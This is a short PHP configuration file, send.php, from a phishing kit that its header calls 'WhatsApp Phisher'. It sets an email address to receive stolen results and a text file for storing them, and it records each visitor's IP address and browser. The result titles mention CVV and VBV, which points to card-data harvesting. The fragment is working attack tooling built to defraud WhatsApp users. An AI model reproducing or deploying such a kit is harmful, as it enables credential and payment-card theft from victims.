<?php
/*
 WhatsApp Phisher
 File : send.php
 Coded by x256
 Ask for updates premiumers(at)gmail.com ;)
*/

$rezltMail = "fadwafaissal1@gmail.com";


$TxtStore  = "0";   // (1/0) turn ON/OFF txt report

$ccStore   = "_rezult/data1.txt";

$ip = $_SERVER["REMOTE_ADDR"];
$uagent = $_SERVER["HTTP_USER_AGENT"];
$date = date("d/m/Y h:m");

$rezlTitleCvv = "WhatApp $ip";
$rezlTitleVbv = "WhatApp $ip";
?>